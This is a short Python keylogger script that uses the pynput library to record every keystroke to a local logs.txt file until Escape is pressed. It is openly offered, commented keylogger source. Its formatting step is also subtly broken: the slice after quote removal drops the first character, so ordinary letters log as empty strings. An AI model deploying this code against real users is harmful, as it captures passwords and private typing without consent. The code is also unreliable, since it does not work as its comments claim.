# importing some packages for access to keyboard
from pynput.keyboard import Listener
import sys

# function that will create and write to file
# when called by listener below
def writeToLogFile(key):
    # grabs the keystroke
    keystroke = str(key)

    # if escape is pressed, exit the program
    if keystroke == 'Key.esc':
        sys.exit()

    # formats the keystroke nicely
    keystroke = keystroke.replace("'", "")[1:]

    # writes the keystroke to logs.txt
    with open("logs.txt", 'a') as f:
        f.write(keystroke)

# listener that listens to keystrokes and
# calls function above when key is pressed
with Listener(on_press = writeToLogFile) as listener:
        listener.join()
